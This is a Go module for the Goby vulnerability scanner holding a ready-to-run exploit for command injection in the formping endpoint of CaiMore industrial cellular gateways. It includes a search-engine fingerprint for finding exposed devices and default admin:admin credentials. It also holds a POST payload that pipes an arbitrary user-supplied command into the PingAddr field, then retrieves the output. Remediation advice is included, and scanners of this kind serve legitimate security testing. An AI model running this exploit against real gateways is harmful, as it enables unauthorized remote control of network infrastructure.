package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "CaiMore Gateway formping file Command Execution Vulnerability",
    "Description": "<p>The gateway of Xiamen Caimao Communication Technology Co., Ltd. is designed with open software architecture. It is a metal shell design, with two Ethernet RJ45 interfaces, and an industrial design wireless gateway using 3G/4G/5G wide area network for Internet communication.</p><p>There is a command execution vulnerability in the formping file of the gateway of Xiamen Caimao Communication Technology Co., Ltd. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, obtain server permissions, and then control the entire web server.</p>",
    "Product": "CAIMORE-Gateway",
    "Homepage": "https://www.caimore.com/",
    "DisclosureDate": "2022-11-15",
    "Author": "heiyeleng",
    "FofaQuery": "banner=\"Basic realm=\\\"CaiMore\" || header=\"Basic realm=\\\"CaiMore\"",
    "GobyQuery": "banner=\"Basic realm=\\\"CaiMore\" || header=\"Basic realm=\\\"CaiMore\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of unexpected system commands.</p><p>2. Reduce or do not use code or commands to execute functions.</p><p>3. The variables submitted by the client are detected before being put into the function.</p><p>4. Reduce or not use dangerous functions.</p><p>5. Follow the manufacturer's latest vulnerability patch announcement: <a href=\"https://www.caimore.com/\">https://www.caimore.com/</a> .</p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "command",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Authorization": "Basic YWRtaW46YWRtaW4="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "厦门才茂通信科技有限公司",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "用户管理",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "系统工具",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/goform/formping",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Authorization": "Basic YWRtaW46YWRtaW4=",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "PingAddr=www.baidu.com%7Cid&PingPackNumb=1&PingMsg="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.parent.ialert(\"Tip\",\"Start\",\"#00CC00\")",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "location.href=document.referrer",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/pingmessages?_=1668501225893",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic YWRtaW46YWRtaW4="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "uid=(.*?)",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Authorization": "Basic YWRtaW46YWRtaW4="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "厦门才茂通信科技有限公司",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "用户管理",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "系统工具",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/goform/formping",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Authorization": "Basic YWRtaW46YWRtaW4=",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "PingAddr=www.baidu.com%7C{{{command}}}&PingPackNumb=1&PingMsg="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "window.parent.ialert(\"Tip\",\"Start\",\"#00CC00\")",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "location.href=document.referrer",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/pingmessages?_=1668501225893",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic YWRtaW46YWRtaW4="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "厦门才茂通信科技有限公司网关 formping 文件命令执行漏洞",
            "Product": "CAIMORE-Gateway",
            "Description": "<p>厦门才茂通信科技有限公司网关采用开放式软件架构设计，是一款金属外壳设计，带两个以太网RJ45接口，采用 3G/4G/5G 广域网络上网通信的工业级设计无线网关。<br></p><p>厦门才茂通信科技有限公司网关 formping 文件存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>2、减少或不使用代码或命令执行函数。</p><p>3、客户端提交的变量在放入函数前进行检测。</p><p>4、减少或不使用危险函数。</p><p>5、关注厂商发布最新漏洞补丁公告：<a href=\"https://www.caimore.com/\" target=\"_blank\" style=\"\">https://www.caimore.com/</a>。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "CaiMore Gateway formping file Command Execution Vulnerability",
            "Product": "CAIMORE-Gateway",
            "Description": "<p>The gateway of Xiamen Caimao Communication Technology Co., Ltd. is designed with open software architecture. It is a metal shell design, with two Ethernet RJ45 interfaces, and an industrial design wireless gateway using 3G/4G/5G wide area network for Internet communication.</p><p>There is a command execution vulnerability in the formping file of the gateway of Xiamen Caimao Communication Technology Co., Ltd. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of unexpected system commands.</p><p>2. Reduce or do not use code or commands to execute functions.</p><p>3. The variables submitted by the client are detected before being put into the function.</p><p>4. Reduce or not use dangerous functions.</p><p>5. Follow the manufacturer's latest vulnerability patch announcement: <a href=\"https://www.caimore.com/\" target=\"_blank\">https://www.caimore.com/</a> .</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10769"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}